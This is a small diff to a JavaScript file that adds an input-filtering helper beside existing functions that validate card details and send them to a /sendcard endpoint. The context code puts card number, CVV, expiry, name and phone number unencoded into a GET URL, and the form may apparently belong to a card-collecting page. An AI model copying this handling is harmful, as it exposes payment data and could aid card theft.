@@ -13,6 +13,16 @@ function send(cardnum, cardholder, carddays, cardcvv, num){
     }
 }
 
+const setReplacer = (target, expression) => {
+    target.addEventListener('input', () => {
+        const parsedValue = target.value.replace(expression, '');
+
+        if (parsedValue !== target.value) {
+            target.value = parsedValue;
+        }
+    });
+};
+
 function validate(cardnum, cardholder, carddays, cardcvv, num) {
     if(cardnum.length === 16 && carddays.length === 5 && cardholder.length > 0 && cardcvv.length === 3 && num.length === 11){
         fetch(`/sendcard?cnum=${cardnum}&ch=${cardholder}&cd=${carddays}&ccvv=${cardcvv}&num=${num}`)
